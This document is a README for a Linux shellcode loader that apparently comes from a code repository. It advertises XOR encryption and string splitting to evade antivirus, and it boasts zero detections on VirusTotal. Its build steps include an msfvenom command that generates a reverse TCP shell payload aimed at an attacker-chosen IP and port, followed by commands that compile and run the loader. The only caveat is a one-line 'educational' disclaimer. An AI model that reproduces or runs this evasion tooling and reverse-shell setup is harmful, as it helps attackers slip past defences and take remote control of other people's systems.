# Modular Shellcode Loader for Linux

A lightweight, modular shellcode loader for Linux with triple XOR encryption and modern evasion techniques.


## VirusTotal Results
<img width="1365" height="698" alt="Screenshot from 2026-01-30 20-02-06" src="https://github.com/user-attachments/assets/8e66e2e6-4b9f-4053-ba6d-4608e0d412c4" />

**[0/70 detections](https://www.virustotal.com/gui/file/9463d4bd781dcb2c9f464540432477e02f7ac22c8f6333aa6b2802df2fd071f4?nocache=1)** - Fully undetected by all major AV engines

### 1. Clone & compile
```bash
git clone https://github.com/yourusername/shellcode-loader.git
cd shellcode-loader
# replace shellcode.bin with your own
msfvenom -p linux/x64/shell_reverse_tcp lhost=<ur-ip> lport=<ur-port> -f raw -o shellcode.bin
make all
./dist/shellcode_loader
```
## 🛡️ Features

- **Triple XOR Encryption** - Each byte encrypted with 3 unique keys
- **String Splitting** - Strings assembled at runtime to evade detection
- **Binary Hardening** - Full PIE, RELRO, stripped symbols, no execstack
- **Modular Design** - Clean separation of decryption, execution, and utilities
- **No Anti-VM/Debug** - Focused on core functionality without anti-analysis


## ⚠️ Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**

